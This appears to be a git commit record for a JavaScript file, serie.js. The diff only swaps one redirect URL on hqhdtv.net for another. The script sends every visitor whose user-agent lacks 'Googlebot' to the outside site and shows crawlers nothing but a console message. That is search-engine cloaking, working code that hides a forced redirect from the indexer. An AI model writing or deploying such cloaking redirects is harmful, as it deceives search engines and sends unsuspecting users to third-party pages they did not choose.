4485b8f820831b2e46949780c7167c6c131136aa
forever2468 <sumaiaakterlaboni531@gmail.com>
2026-09-21 00:23:15 +0600

    Update serie.js

--- serie.js
+++ serie.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://hqhdtv.net/serie-a/?sm";
+  window.location.href = "https://hqhdtv.net/portuguese-primeira-liga/?sm";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("Thanks for visiting my page");
